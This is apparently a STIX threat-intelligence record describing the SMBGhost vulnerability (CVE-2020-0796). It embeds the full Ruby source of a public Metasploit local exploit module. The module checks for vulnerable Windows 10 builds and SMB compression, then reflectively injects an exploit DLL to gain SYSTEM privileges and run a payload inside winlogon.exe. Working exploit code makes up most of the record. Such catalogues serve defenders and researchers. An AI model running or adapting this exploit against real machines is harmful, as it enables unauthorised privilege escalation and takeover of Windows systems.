{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--997430e3-e88c-4705-b157-da11ced448b0",
    "created": "2024-08-14T16:49:27.356924Z",
    "modified": "2024-08-14T16:49:27.356928Z",
    "name": "SMBv3 Compression Buffer Overflow",
    "description": " A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to execute code on a vulnerable server. This local exploit implementation leverages this flaw to elevate itself before injecting a payload into winlogon.exe.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2020_0796_smbghost.rb",
            "external_id": "cve_2020_0796_smbghost.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-0796"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/danigargu/CVE-2020-0796"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'SMBv3 Compression Buffer Overflow',\n          'Description' => %q{\n            A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to\n            execute code on a vulnerable server. This local exploit implementation leverages this flaw to elevate itself\n            before injecting a payload into winlogon.exe.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Daniel Garc\u00eda Guti\u00e9rrez', # original LPE exploit\n            'Manuel Blanco Paraj\u00f3n', # original LPE exploit\n            'Spencer McIntyre' # metasploit module\n          ],\n          'Arch' => [ ARCH_X86, ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            # [ 'Windows 10 x86', { 'Arch' => ARCH_X86 } ],\n            [ 'Windows 10 v1903-1909 x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'Payload' => {\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2020-0796' ],\n            [ 'URL', 'https://github.com/danigargu/CVE-2020-0796' ],\n            [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005' ]\n          ],\n          'DisclosureDate' => '2020-03-13',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'AKA' => [ 'SMBGhost', 'CoronaBlue' ],\n            'Stability' => [ CRASH_OS_RESTARTS, ],\n            'SideEffects' => [ IOC_IN_LOGS ],\n            'Reliability' => [ REPEATABLE_SESSION, ],\n            'RelatedModules' => [ 'exploit/windows/smb/cve_2020_0796_smbghost' ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    version = get_version_info\n    vprint_status(\"Windows Build Number = #{version.build_number}\")\n    # see https://docs.microsoft.com/en-us/windows/release-information/\n    unless version.build_number.between?(Msf::WindowsVersion::Win10_1903, Msf::WindowsVersion::Win10_1909)\n      print_error('The exploit only supports Windows 10 versions 1903 - 1909')\n      return CheckCode::Safe\n    end\n\n    disable_compression = registry_getvaldata('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters', 'DisableCompression')\n    if !disable_compression.nil? && disable_compression != 0\n      print_error('The exploit requires compression to be enabled')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    print_status('Reflectively injecting the exploit DLL and executing it...')\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-0796', 'CVE-2020-0796.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-13",
    "x_mitre_platforms": [
        "win'"
    ]
}